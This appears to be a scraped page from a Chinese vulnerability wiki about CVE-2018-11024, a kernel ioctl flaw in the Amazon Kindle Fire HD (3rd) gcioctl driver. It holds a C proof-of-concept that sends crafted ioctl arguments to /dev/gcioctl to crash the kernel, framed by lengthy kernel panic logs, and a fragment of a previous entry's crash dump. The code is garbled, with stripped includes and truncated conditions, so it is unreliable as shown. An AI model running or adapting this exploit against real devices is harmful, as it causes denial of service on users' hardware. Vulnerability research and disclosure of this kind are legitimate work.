00000001 d02bfdf4 d02bfd90 c06a5318 c0008370 20000013 00000082 [ 96.270660] fd98 00000001 00000001 d02be000 1a03e6f3 00000001 1a03e6ef 00000001 dd3eeca8 [ 96.281311] fdb8 00000000 d02bfdf4 d02bfdf8 d02bfdd8 c06a4e10 c06a4d88 20000093 ffffffff [ 96.292053] fdd8 0000020a 00000082 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 c06a4d5c [ 96.302825] fdf8 d02bfe14 d02bfe08 c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 c06a4e20 [ 96.313415] fe18 d84a38d8 d84a2800 d84a3800 0000000a d02be000 c33a3180 d02bfe54 1a03e6ef [ 96.323883] fe38 bed24608 d02be000 d627f000 bed24608 dd3eeca8 00000000 d02bfe6c d02bfe60 [ 96.334533] [ 96.334533] IP: 0xd02bfd78: [ 96.339416] fd78 d02bfdc4 00000001 d02bfdf4 d02bfd90 c06a5318 c0008370 20000013 00000082 [ 96.349853] fd98 00000001 00000001 d02be000 1a03e6f3 00000001 1a03e6ef 00000001 dd3eeca8 [ 96.360290] fdb8 00000000 d02bfdf4 d02bfdf8 d02bfdd8 c06a4e10 c06a4d88 20000093 ffffffff [ 96.370727] fdd8 0000020a 00000082 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 c06a4d5c [ 96.381042] fdf8 d02bfe14 d02bfe08 c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 c06a4e20 [ 96.391479] fe18 d84a38d8 d84a2800 d84a3800 0000000a d02be000 c33a3180 d02bfe54 1a03e6ef [ 96.402008] fe38 bed24608 d02be000 d627f000 bed24608 dd3eeca8 00000000 d02bfe6c d02bfe60 [ 96.412445] fe58 c06a319c c06a2fec d02bff04 d02bfe70 c0317c28 c06a3194 00000001 00000028 [ 96.422790] [ 96.422790] FP: 0xd02bfd74: [ 96.427795] fd74 ffffffff d02bfdc4 00000001 d02bfdf4 d02bfd90 c06a5318 c0008370 20000013 [ 96.438140] fd94 00000082 00000001 00000001 d02be000 1a03e6f3 00000001 1a03e6ef 00000001 [ 96.448699] fdb4 dd3eeca8 00000000 d02bfdf4 d02bfdf8 d02bfdd8 c06a4e10 c06a4d88 20000093 [ 96.459289] fdd4 ffffffff 0000020a 00000082 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 [ 96.470031] fdf4 c06a4d5c d02bfe14 d02bfe08 c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 [ 96.480438] fe14 c06a4e20 d84a38d8 d84a2800 d84a3800 0000000a d02be000 c33a3180 d02bfe54 [ 96.490875] fe34 1a03e6ef bed24608 d02be000 d627f000 bed24608 dd3eeca8 00000000 d02bfe6c [ 96.501495] fe54 d02bfe60 c06a319c c06a2fec d02bff04 d02bfe70 c0317c28 c06a3194 00000001 [ 96.512023] [ 96.512023] R4: 0xd02bdf80: [ 96.517089] df80 000003ef 61ef22a8 61ef2278 61ef22d8 00000036 c0013e08 00000000 d02bdfa8 [ 96.527679] dfa0 c0013c60 c0136578 61ef22a8 61ef2278 0000000a c0186201 65490ce8 65490ce0 [ 96.538208] dfc0 61ef22a8 61ef2278 61ef22d8 00000036 00000001 65393000 6253ab8c 4010f2ec [ 96.548797] dfe0 00000001 65490cd0 400f0273 400e3804 600f0010 0000000a 5788f1b0 0000000b [ 96.559356] e000 00000002 00000003 00000000 d4736f80 c0a0e840 00000000 00000015 c4fcf880 [ 96.569885] e020 00000000 d02be000 c09ddc50 d4736f80 dd0be600 c1617b40 d02bfdf4 d02bfd40 [ 96.580535] e040 c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000 [ 96.591125] e060 005bc4c0 5ebfea7f 00000000 00000000 00000000 00000000 00000000 00000000 [ 96.601684] [ 96.601684] R9: 0xdd3eec28: [ 96.606628] ec28 dd3eec28 dd3eec28 00000000 00000000 00000000 c06bc674 000200da c09dda58 [ 96.617218] ec48 00000000 00000000 dd3eec50 dd3eec50 00000000 c0aa5174 c0aa5174 c0aa5148 [ 96.627716] ec68 5aefd4d7 00000000 00000000 00000000 dd3eec80 00000000 00000000 00000000 [ 96.638275] ec88 00200000 00000000 00000000 dd3eec94 dd3eec94 dd3d6fc0 dd3d6fc0 00000000 [ 96.648864] eca8 000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400 [ 96.659423] ecc8 dd3eed80 dd33ae70 00001064 00000001 0fb00000 5aefd4d7 2d2b4d15 5aefd4d7 [ 96.669921] ece8 2d2b4d15 5aefd4d7 2d2b4d15 00000000 00000000 00000000 00000000 00000000 [ 96.680572] ed08 00000000 00000000 00000000 00000000 00000001 00000000 00000000 dd3eed24 [ 96.691162] Process gcioctl_poc_3 (pid: 3395, stack limit = 0xd02be2f8) [ 96.698455] Stack: (0xd02bfdd8 to 0xd02c0000) [ 96.703430] fdc0: 0000020a 00000082 [ 96.712554] fde0: 1a03e6f3 d02be000 d02bfe04 d02bfdf8 c06a4e10 c06a4d5c d02bfe14 d02bfe08 [ 96.721588] fe00: c06a4e24 c06a4e0c d02bfe5c d02bfe18 c06a3008 c06a4e20 d84a38d8 d84a2800 [ 96.730743] fe20: d84a3800 0000000a d02be000 c33a3180 d02bfe54 1a03e6ef bed24608 d02be000 [ 96.739837] fe40: d627f000 bed24608 dd3eeca8 00000000 d02bfe6c d02bfe60 c06a319c c06a2fec [ 96.748840] fe60: d02bff04 d02bfe70 c0317c28 c06a3194 00000001 00000028 000fffff d02bfea0 [ 96.757934] fe80: d02bfedc d02bfe90 c0207454 c00bd920 0000001e c33a3180 d02bfed4 d02bfea8 [ 96.767059] fea0: 244085aa 1a03e6ef 000003f4 00000000 00000000 00000001 00000000 d02bff14 [ 96.776214] fec0: 00000000 00000001 dd3eeca8 c24d8a00 d02bfefc d02bfee0 c02089fc 00000000 [ 96.785247] fee0: d627f000 00000004 d627f000 bed24608 dd3eeca8 00000000 d02bff74 d02bff08 [ 96.794403] ff00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 [ 96.803649] ff20: dcf8c770 d02bff0c d02be000 bed24638 bed24608 c0145d9f d627f000 00000004 [ 96.812744] ff40: d02be000 00000000 d02bff64 00000000 bed24608 c0145d9f d627f000 00000004 [ 96.821746] ff60: d02be000 00000000 d02bffa4 d02bff78 c01365e0 c0135fc4 00000000 00000000 [ 96.830932] ff80: 00000400 bed24638 00010e54 00000000 00000036 c0013e08 00000000 d02bffa8 [ 96.840118] ffa0: c0013c60 c0136578 bed24638 00010e54 00000004 c0145d9f bed24608 bed24608 [ 96.849121] ffc0: bed24638 00010e54 00000000 00000036 00000000 00000000 00000000 bed24624 [ 96.858245] ffe0: 00000000 bed245ec 00010690 0002917c 60000010 00000004 006f0063 002e006d [ 96.867340] Backtrace: [ 96.870330] [] (__raw_spin_lock_irqsave+0x0/0xb0) from [] (_raw_spin_lock_irqsave+0x10/0x14) [ 96.881591] r6:d02be000 r5:1a03e6f3 r4:00000082 r3:0000020a [ 96.888488] [] (_raw_spin_lock_irqsave+0x0/0x14) from [] (_raw_spin_lock_irq+0x10/0x14) [ 96.899291] [] (_raw_spin_lock_irq+0x0/0x14) from [] (wait_for_common+0x28/0x150) [ 96.909729] [] (wait_for_common+0x0/0x150) from [] (wait_for_completion_interruptible_timeout+0x14/0x18) [ 96.922149] [] (wait_for_completion_interruptible_timeout+0x0/0x18) from [] (dev_ioctl+0x7ec/0x10c4) [ 96.934204] [] (dev_ioctl+0x0/0x10c4) from [] (do_vfs_ioctl+0x8c/0x5b4) [ 96.943481] [] (do_vfs_ioctl+0x0/0x5b4) from [] (sys_ioctl+0x74/0x84) [ 96.952636] [] (sys_ioctl+0x0/0x84) from [] (ret_fast_syscall+0x0/0x30) [ 96.961822] r8:c0013e08 r7:00000036 r6:00000000 r5:00010e54 r4:bed24638 [ 96.970153] Code: e5843004 e10f0000 f10c0080 e1953f9f (e3330000) [ 96.977264] Board Information: [ 96.977264] Revision : 0001 [ 96.977294] Serial : 0000000000000000 [ 96.977294] SoC Information: [ 96.977294] CPU : OMAP4470 [ 96.977294] Rev : ES1.0 [ 96.977325] Type : HS [ 96.977325] Production ID: 0002B975-000000CC [ 96.977325] Die ID : 1CC60000-50002FFF-0B00935D-11007004 [ 96.977355] [ 97.013824] ---[ end trace 2432291f2b5d99ba ]--- [ 97.019195] Kernel panic - not syncing: Fatal exception [ 97.025024] CPU1: stopping [ 97.028137] Backtrace: [ 97.031311] [] (dump_backtrace+0x0/0x10c) from [] (dump_stack+0x18/0x1c) [ 97.040679] r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950 [ 97.047668] [] (dump_stack+0x0/0x1c) from [] (handle_IPI+0x190/0x1c4) [ 97.056884] [] (handle_IPI+0x0/0x1c4) from [] (gic_handle_irq+0x58/0x60) [ 97.066253] [] (gic_handle_irq+0x0/0x60) from [] (__irq_svc+0x40/0x70) [ 97.075561] Exception stack(0xd6cb7d28 to 0xd6cb7d70) [ 97.081237] 7d20: c1620b40 c3152ac0 d799dc70 00000000 00000000 c1620b40 [ 97.090454] 7d40: d6cb6000 c4eaaf80 00000001 c4eaaf80 c1620b40 d6cb7d7c d6cb7d80 d6cb7d70 [ 97.099670] 7d60: c0074004 c06a4880 60070013 ffffffff [ 97.105346] r6:ffffffff r5:60070013 r4:c06a4880 r3:c0074004 [ 97.112487] [] (_raw_spin_unlock_irq+0x0/0x50) from [] (finish_task_switch+0x58/0x12c) [ 97.123321] [] (finish_task_switch+0x0/0x12c) from [] (__schedule+0x3ec/0x830) [ 97.133239] r8:c3152ac0 r7:c09ddc50 r6:d6cb6000 r5:c09b6b40 r4:c4fcf340 [ 97.141143] r3:00000001 [ 97.144500] [] (__schedule+0x0/0x830) from [] (preempt_schedule+0x40/0x5c) [ 97.154174] [] (preempt_schedule+0x0/0x5c) from [] (_raw_spin_unlock+0x48/0x4c) [ 97.164337] r4:c0a7375c r3:00000002 [ 97.168731] [] (_raw_spin_unlock+0x0/0x4c) from [] (futex_wake+0xfc/0x130) [ 97.178436] [] (futex_wake+0x0/0x130) from [] (do_futex+0xf8/0x9e8) [ 97.187469] [] (do_futex+0x0/0x9e8) from [] (sys_futex+0x94/0x178) [ 97.196289] [] (sys_futex+0x0/0x178) from [] (ret_fast_syscall+0x0/0x30) [ 97.205871] CPU0 PC (0) : 0xc003ee38 [ 97.209930] CPU0 PC (1) : 0xc003ee54 [ 97.214111] CPU0 PC (2) : 0xc003ee54 [ 97.218170] CPU0 PC (3) : 0xc003ee54 [ 97.222229] CPU0 PC (4) : 0xc003ee54 [ 97.226409] CPU0 PC (5) : 0xc003ee54 [ 97.230468] CPU0 PC (6) : 0xc003ee54 [ 97.234527] CPU0 PC (7) : 0xc003ee54 [ 97.238739] CPU0 PC (8) : 0xc003ee54 [ 97.242767] CPU0 PC (9) : 0xc003ee54 [ 97.246826] CPU1 PC (0) : 0xc0019b2c [ 97.251007] CPU1 PC (1) : 0xc0019b2c [ 97.255065] CPU1 PC (2) : 0xc0019b2c [ 97.259124] CPU1 PC (3) : 0xc0019b2c [ 97.263183] CPU1 PC (4) : 0xc0019b2c [ 97.267364] CPU1 PC (5) : 0xc0019b2c [ 97.271423] CPU1 PC (6) : 0xc0019b2c [ 97.275482] CPU1 PC (7) : 0xc0019b2c [ 97.279693] CPU1 PC (8) : 0xc0019b2c [ 97.283752] CPU1 PC (9) : 0xc0019b2c [ 97.287811] [ 97.289581] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017 [ 97.289611] 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-04 15:06:20 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/Amazon Kindle Fire HD/CVE-2018-11024.html":{"url":"iot/Amazon Kindle Fire HD/CVE-2018-11024.html","title":"（CVE-2018-11024）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞","keywords":"","body":"（CVE-2018-11024）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞 一、漏洞简介 Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3的内核组件中的内核模块/omap/drivers/misc/gcx/gcioctl/gcif.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ gcioctl使用命令1077435789并导致内核崩溃。 二、漏洞影响 Fire OS 4.5.5.3 三、复现过程 poc #include #include //strlen #include #include //inet_addr #include //write #include #include #include #include #include // Socket boilerplate code taken from here: http://www.binarytides.com/server-client-example-c-sockets-linux/ /* seed, ioctl_id, num_mappings, num_blobs, dev_name_len, dev_name, map_entry_t_arr, blobs */ int debug = 1; typedef struct { int src_id; int dst_id; int offset; } map_entry_t; short tiny_vals[18] = {128, 127, 64, 63, 32, 31, 16, 15, 8, 7, 4, 3, 2, 1, 0, 256, 255, -1}; int *small_vals; int num_small_vals; // populates small_vals when called void populate_arrs(int top) { int num = 1; int count = 0; while (num >= 1; small_vals = malloc(sizeof(int)*count); memset(small_vals, 0, count); int i = 0; while(num > 1) { small_vals[i] = num; i++; small_vals[i] = num-1; i++; num >>= 1; } small_vals[i] = 0; small_vals[i+1] = top; small_vals[i+2] = top-1; small_vals[i+3] = -1; } // generate a random value of size size and store it in elem. // value has a weight % chance to be a \"small value\" void gen_rand_val(int size, char *elem, int small_weight) { int i; if ((rand() % 100) 0 ) { // recv the entire message char *recv_buf = calloc(msg_size, sizeof(char)); if (recv_buf == NULL) { printf(\"Failed to allocate recv_buf\\n\"); exit(-1); } int nrecvd = recv(client_sock, recv_buf, msg_size, 0); if (nrecvd != msg_size) { printf(\"Error getting all data!\\n\"); printf(\"nrecvd: %d\\nmsg_size:%d\\n\", nrecvd, msg_size); exit(-1); } // quickly save a copy of the most recent data int savefd = open(\"/sdcard/saved\", O_WRONLY|O_TRUNC|O_CREAT, 0644); if (savefd 0) { int buf_len = 128; char *tmp_generic = malloc(buf_len); memset(tmp_generic, 0, buf_len); // 95% chance we fill it with data if ((rand() % 100) > 95) { // if dst_id is 8) weight = 0; else weight = default_weight; for (i=0; i = 264) { printf(\"Code a better solution for storing generics\\n\"); exit(1); } } } // a struct ptr, so we have the data else { // 1 in 400 chance we don't fixup if ( (rand() % 400) > 0) { // now point it to the correct struct/blob // printf(\"placing %p, at %p\\n\", ptr_arr[entry.dst_id], tmp+entry.offset); memcpy(tmp+entry.offset, &ptr_arr[entry.dst_id], sizeof(void *)); } } } if (debug) { printf(\"ioctl_id: %d\\n\", ioctl_id); printf(\"num_mappings: %d\\n\", num_mappings); printf(\"num_blobs: %d\\n\", num_blobs); printf(\"dev_name_len: %d\\n\", dev_name_len); printf(\"dev_name: %s\\n\", dev_name); printf(\"data[]: \\n\"); //printf(\"(0x%x)\\n\", *(int *)&ptr_arr[0]); printf(\"(0x%p) : \", &ptr_arr[0]); printf(\"(0x%016lx)\\n\", *(unsigned long int *)ptr_arr[0]); printf(\"(0x%p) : \", (&ptr_arr[0]+1*8)); printf(\"(0x%016lx)\\n\", *(unsigned long int *)(ptr_arr[0]+1*8)); printf(\"(0x%p) : \", (&ptr_arr[0]+2*8)); printf(\"(0x%016lx)\\n\", *(unsigned long int *)(ptr_arr[0]+2*8)); printf(\"(0x%p) : \", (&ptr_arr[0]+3*8)); printf(\"(0x%016lx)\\n\", *(unsigned long int *)(ptr_arr[0]+3*8)); printf(\"(0x%p) : \", (&ptr_arr[0]+4*8)); printf(\"(0x%016lx)\\n\", *(unsigned long int *)(ptr_arr[0]+4*8)); //printf(\"(0x%016lx)\\n\", *(unsigned long int *)(ptr_arr[0]+5*8)); //printf(\"(0x%016lx)\\n\", *(unsigned long int *)(ptr_arr[0]+6*8)); //printf(\"(0x%x)\\n\", (int *)ptr_arr, (int *)ptr_arr); } // time for the actual ioctl //printf(\"Try to open device %s\\n\", dev_name); //fflush(stdout); int fd = open(dev_name, O_RDONLY); if (fd 崩溃日志 [ 144.428375] Unable to handle kernel paging request at virtual address d900000c [ 144.436462] pgd = dcac0000 [ 144.439697] [d900000c] *pgd=00000000 [ 144.443939] Internal error: Oops: 5 [#1] PREEMPT SMP ARM [ 144.450012] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O) [ 144.457672] CPU: 0 Tainted: G O (3.4.83-gd2afc0bae69 #1) [ 144.465118] PC is at c2dm_l1cache+0x30/0x100 [ 144.469940] LR is at dev_ioctl+0x3f0/0x10c4 [ 144.474670] pc : [] lr : [] psr: a0000013 [ 144.474670] sp : c2d6be38 ip : 00000000 fp : c2d6be6c [ 144.487640] r10: 00000000 r9 : d8c0cca8 r8 : 00b8dd90 [ 144.493621] r7 : 00000000 r6 : c2d6bea4 r5 : 00b8dd90 r4 : 388b77c4 [ 144.500915] r3 : d9000004 r2 : 75e0c121 r1 : c2d6bea4 r0 : 00000000 [ 144.508331] Flags: NzCv IRQs on FIQs on Mode SVC_32 ISA ARM Segment user [ 144.516418] Control: 10c5387d Table: 9cac004a DAC: 00000015 [ 144.522827] [ 144.522857] PC: 0xc031872c: [ 144.527954] 872c e51b2034 e592300c eaffffa5 e30c281c e34c209d e5923000 e3530000 1affffbd [ 144.538482] 874c eaffffc0 e51b303c e51b1040 e2833001 e51b2034 e1530001 e50b303c e2822010 [ 144.549163] 876c e50b2034 1affff8c eaffff83 c09dc81c e1a0c00d e92ddff0 e24cb004 e24dd00c [ 144.559844] 878c e3500000 e1a07002 e50b0030 da00000d e0814200 e1a06001 e1a03001 e3a02000 [ 144.570404] 87ac e5930008 e593c004 e2833010 e1530004 e022209c 1afffff9 e3520902 3a000003 [ 144.581085] 87cc e3570002 9a000022 e24bd028 e89daff0 e59f9090 e2818008 e3a0a000 e5963008 [ 144.591735] 87ec e5184008 e3530000 13a05000 1a00000a ea000010 e5181004 e5993024 e0841001 [ 144.602416] 880c e12fff33 e5962008 e2855001 e596300c e1550002 e0844003 2a000006 e2572000 [ 144.612976] [ 144.612976] LR: 0xc03177ac: [ 144.618072] 77ac ebf55c15 eaffff35 e3053d8d e3443038 e1510003 1affff30 e1a0200d e3c23d7f [ 144.628631] 77cc e3c3303f e24b0064 e5933008 e2952038 30d22003 33a03000 e3530000 1a0001a8 [ 144.639160] 77ec e1a01005 e3a02038 ebfcfa90 e3500000 1a00000e e51b2030 e3520001 0a0001cb [ 144.649780] 780c e3520002 0a0001ee e3520000 1a000007 e51b0064 e3a02000 e24b1060 eb0003d3 [ 144.660369] 782c e51b0064 e24b1060 e51b2030 eb000338 e3a05000 eaffff11 e24b1064 e50b1088 [ 144.670776] 784c e51b0088 e3a01010 ebfd03c1 e3a03004 e50b3064 e5963008 e2952004 30d22003 [ 144.681213] 786c 33a03000 e3530000 0a0001c5 e3e0500d eaffff02 e1a0200d e3c26d7f e3c6603f [ 144.691528] 788c e5963008 e2952008 30d22003 33a03000 e3530000 1a000021 e24b3064 e1a01005 [ 144.701995] [ 144.701995] SP: 0xc2d6bdb8: [ 144.706878] bdb8 c2d6be24 00b8dd90 c2d6bdec c2d6bdd0 c00084d0 c03187ac a0000013 ffffffff [ 144.717407] bdd8 c2d6be24 00b8dd90 c2d6be6c c2d6bdf0 c06a5318 c0008370 00000000 c2d6bea4 [ 144.727905] bdf8 75e0c121 d9000004 388b77c4 00b8dd90 c2d6bea4 00000000 00b8dd90 d8c0cca8 [ 144.738586] be18 00000000 c2d6be6c 00000000 c2d6be38 c031782c c03187ac a0000013 ffffffff [ 144.749145] be38 c02ba53c 575b4b92 d8578000 00000000 00b8dd90 0000000b dcae46c0 00b8dd90 [ 144.759796] be58 d8c0cca8 00000000 c2d6bf04 c2d6be70 c031782c c0318788 00000001 00000088 [ 144.770355] be78 000ffeff 00000001 c2d6bedc c2d6be90 c0207454 c00bd920 00000027 d7ce5000 [ 144.781005] be98 c2d6bed4 c2d6bea8 575b4b92 4ccba3b5 47a0578f 83b275c7 00000000 00020261 [ 144.791687] [ 144.791687] FP: 0xc2d6bdec: [ 144.796661] bdec c0008370 00000000 c2d6bea4 75e0c121 d9000004 388b77c4 00b8dd90 c2d6bea4 [ 144.807189] be0c 00000000 00b8dd90 d8c0cca8 00000000 c2d6be6c 00000000 c2d6be38 c031782c [ 144.817840] be2c c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000 00000000 00b8dd90 [ 144.828399] be4c 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04 c2d6be70 c031782c [ 144.839080] be6c c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc c2d6be90 c0207454 [ 144.849761] be8c c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92 4ccba3b5 47a0578f [ 144.860290] beac 83b275c7 00000000 00020261 00000000 00000000 00000000 00000000 00000000 [ 144.870971] becc 00000000 00000000 00000000 c02089fc 00000000 dcae46c0 0000000b dcae46c0 [ 144.881652] [ 144.881652] R1: 0xc2d6be24: [ 144.886627] be24 c2d6be38 c031782c c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000 [ 144.897308] be44 00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04 [ 144.907989] be64 c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc [ 144.918518] be84 c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92 [ 144.929199] bea4 4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000 00000000 [ 144.939849] bec4 00000000 00000000 00000000 00000000 00000000 c02089fc 00000000 dcae46c0 [ 144.950531] bee4 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08 c0136044 [ 144.961059] bf04 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440 [ 144.971710] [ 144.971710] R3: 0xd8ffff84: [ 144.976623] ff84 d8ffff20 d8efb000 00000707 020e40fb d8efb075 d8ffff3c d8efb01c d8ffffa0 [ 144.987213] ffa4 d8ffffa0 d8efb028 ca9788f0 d8ffffb0 d8ffffb0 00000000 bf06e9c8 80000088 [ 144.997772] ffc4 dd2eac00 dd309540 00000000 00000000 00000000 00000000 00000000 00000000 [ 145.008392] ffe4 00000000 00000000 00000000 00000000 00000000 00000000 00000000 ******** [ 145.018798] 0004 ******** ******** ******** ******** ******** ******** ******** ******** [ 145.029327] 0024 ******** ******** ******** ******** ******** ******** ******** ******** [ 145.039886] 0044 ******** ******** ******** ******** ******** ******** ******** ******** [ 145.050384] 0064 ******** ******** ******** ******** ******** ******** ******** ******** [ 145.060913] [ 145.060913] R6: 0xc2d6be24: [ 145.066009] be24 c2d6be38 c031782c c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000 [ 145.076568] be44 00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04 [ 145.087219] be64 c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc [ 145.097900] be84 c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92 [ 145.108459] bea4 4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000 00000000 [ 145.118988] bec4 00000000 00000000 00000000 00000000 00000000 c02089fc 00000000 dcae46c0 [ 145.129638] bee4 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08 c0136044 [ 145.140319] bf04 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440 [ 145.150848] [ 145.150848] R9: 0xd8c0cc28: [ 145.155944] cc28 d8c0cc28 d8c0cc28 00000000 00000000 00000000 c06bc674 000200da c09dda58 [ 145.166503] cc48 00000000 00000000 d8c0cc50 d8c0cc50 00000000 c0aa5174 c0aa5174 c0aa5148 [ 145.177062] cc68 5aefd94b 00000000 00000000 00000000 d8c0cc80 9ad1f453 00000000 00000000 [ 145.187713] cc88 00200000 00000000 00000000 d8c0cc94 d8c0cc94 dd3b56c0 dd3b56c0 00000000 [ 145.198394] cca8 000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400 [ 145.208923] ccc8 d8c0cd80 dd3e3e70 00001064 00000001 0fb00000 5aefd94b 2d2b4d13 5aefd94b [ 145.219573] cce8 2d2b4d13 5aefd94b 2d2b4d13 00000000 00000000 00000000 00000000 00000000 [ 145.230255] cd08 00000000 00000000 00000000 00000000 00000001 00000000 00000000 d8c0cd24 [ 145.240936] Process executor32 (pid: 3810, stack limit = 0xc2d6a2f8) [ 145.248016] Stack: (0xc2d6be38 to 0xc2d6c000) [ 145.253082] be20: c02ba53c 575b4b92 [ 145.262176] be40: d8578000 00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 [ 145.271392] be60: c2d6bf04 c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001 [ 145.280609] be80: c2d6bedc c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 [ 145.289703] bea0: 575b4b92 4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000 [ 145.298919] bec0: 00000000 00000000 00000000 00000000 00000000 00000000 c02089fc 00000000 [ 145.308105] bee0: dcae46c0 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08 [ 145.317352] bf00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 [ 145.326416] bf20: dcf8c440 c2d6bf0c c2d6a000 00b8dd80 00b8dd90 40385d8d dcae46c0 0000000b [ 145.335662] bf40: c2d6a000 00000000 c2d6bf64 00000000 00b8dd90 40385d8d dcae46c0 0000000b [ 145.344879] bf60: c2d6a000 00000000 c2d6bfa4 c2d6bf78 c01365e0 c0135fc4 00000000 00000000 [ 145.354095] bf80: c0013e08 00b8dd80 000121c0 00000000 00000036 c0013e08 00000000 c2d6bfa8 [ 145.363159] bfa0: c0013c60 c0136578 00b8dd80 000121c0 0000000b 40385d8d 00b8dd90 00b8dd90 [ 145.372406] bfc0: 00b8dd80 000121c0 00000000 00000036 00000000 00000000 00000000 bee035f4 [ 145.381622] bfe0: 810100fc bee030f4 00011578 0002b28c 60000010 0000000b 4d6969d9 03020430 [ 145.390686] Backtrace: [ 145.393829] [] (c2dm_l1cache+0x0/0x100) from [] (dev_ioctl+0x3f0/0x10c4) [ 145.403228] [] (dev_ioctl+0x0/0x10c4) from [] (do_vfs_ioctl+0x8c/0x5b4) [ 145.412658] [] (do_vfs_ioctl+0x0/0x5b4) from [] (sys_ioctl+0x74/0x84) [ 145.421874] [] (sys_ioctl+0x0/0x84) from [] (ret_fast_syscall+0x0/0x30) [ 145.431304] r8:c0013e08 r7:00000036 r6:00000000 r5:000121c0 r4:00b8dd80 [ 145.439605] Code: e0814200 e1a06001 e1a03001 e3a02000 (e5930008) [ 145.450225] Board Information: [ 145.450225] Revision : 0001 [ 145.450256] Serial : 0000000000000000 [ 145.450256] SoC Information: [ 145.450256] CPU : OMAP4470 [ 145.450286] Rev : ES1.0 [ 145.450286] Type : HS [ 145.450286] Production ID: 0002B975-000000CC [ 145.450286] Die ID : 1CC60000-50002FFF-0B00935D-11007004 [ 145.450317] [ 145.485900] ---[ end trace 0fe3b4c74b4e9fa7 ]--- [ 145.491149] Kernel panic - not syncing: Fatal exception [ 145.496917] CPU1: stopping [ 145.500152] Backtrace: [ 145.503204] [] (dump_backtrace+0x0/0x10c) from [] (dump_stack+0x18/0x1c) [ 145.512695] r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950 [ 145.519714] [] (dump_stack+0x0/0x1c) from [] (handle_IPI+0x190/0x1c4) [ 145.528961] [] (handle_IPI+0x0/0x1c4) from [] (gic_handle_irq+0x58/0x60) [ 145.538482] [] (gic_handle_irq+0x0/0x60) from [] (__irq_usr+0x40/0x60) [ 145.547637] Exception stack(0xd85a5fb0 to 0xd85a5ff8) [ 145.553466] 5fa0: 41822290 418185e8 00000001 41c95000 [ 145.562561] 5fc0: 418185e8 41687460 4010d0ec 418185e8 4010d038 41689398 7fffffff 401602ec [ 145.571777] 5fe0: 418191e8 5ba34d10 41609aa8 41609974 200b0010 ffffffff [ 145.579284] r6:ffffffff r5:200b0010 r4:41609974 r3:41822290 [ 145.586364] CPU0 PC (0) : 0xc003ee38 [ 145.590576] CPU0 PC (1) : 0xc003ee54 [ 145.594635] CPU0 PC (2) : 0xc003ee54 [ 145.598693] CPU0 PC (3) : 0xc003ee54 [ 145.602722] CPU0 PC (4) : 0xc003ee54 [ 145.606781] CPU0 PC (5) : 0xc003ee54 [ 145.610839] CPU0 PC (6) : 0xc003ee54 [ 145.614898] CPU0 PC (7) : 0xc003ee54 [ 145.619110] CPU0 PC (8) : 0xc003ee54 [ 145.623168] CPU0 PC (9) : 0xc003ee54 [ 145.627227] CPU1 PC (0) : 0xc0019b2c [ 145.631408] CPU1 PC (1) : 0xc0019b2c [ 145.635467] CPU1 PC (2) : 0xc0019b2c [ 145.639495] CPU1 PC (3) : 0xc0019b2c [ 145.643707] CPU1 PC (4) : 0xc0019b2c [ 145.647766] CPU1 PC (5) : 0xc0019b2c [ 145.651824] CPU1 PC (6) : 0xc0019b2c [ 145.656005] CPU1 PC (7) : 0xc0019b2c [ 145.660064] CPU1 PC (8) : 0xc0019b2c [ 145.664123] CPU1 PC (9) : 0xc0019b2c [ 145.668182] [ 145.669952] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017 [ 145.669982] 零组资料文库 all right reserved，powered by 